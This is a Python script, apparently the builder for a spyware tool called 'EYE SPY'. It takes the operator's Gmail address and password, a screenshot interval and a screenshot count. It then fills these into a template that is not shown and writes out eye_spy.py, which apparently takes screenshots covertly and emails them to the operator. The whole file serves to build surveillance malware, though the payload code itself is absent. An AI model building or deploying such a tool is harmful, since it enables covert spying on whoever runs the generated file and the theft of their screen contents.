from validate_email import validate_email
import os 
import colorama
from colorama import *
import argparse
colorama.init()
banner="""
                  ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄
       ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
      ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
     ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
    ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █
   ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
  ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
 """
def parse_arguments():
 global email,password,time,count
 print(banner)
 parser = argparse.ArgumentParser(description="EYE SPY")
 parser.add_argument('email', help="Email adress(gmail)")
 parser.add_argument('password', help="Password from your email")
 parser.add_argument('-t','--delay',help="Delay in seconds after previous screenshot",default="300")
 parser.add_argument('-n','--number',help="How many screenshots to take until sending email",default="12")
 args = parser.parse_args()
 email=args.email
 password=args.password 
 time=args.delay
 count=args.number
def main():
 parse_arguments()
 check_mail()
 generate()
def generate():
 with open("code",'r') as file_code:
  with open("eye_spy.py",'w') as eye:
   eye.write(file_code.read().format(email,password,time,count))
 print(Fore.GREEN+"Code was generated"+Fore.RESET)
 exit()
def check_mail():
 ch=validate_email(email,verify=True)
 if ch == True:
  print(Fore.GREEN+"Email {} was found. Generating code...".format(email)+Fore.RESET)
 else:
  print(Fore.RED+"Email {} wasn't found. Exiting...".format(email)+Fore.RESET)
  exit()
if __name__=="__main__":
 main()


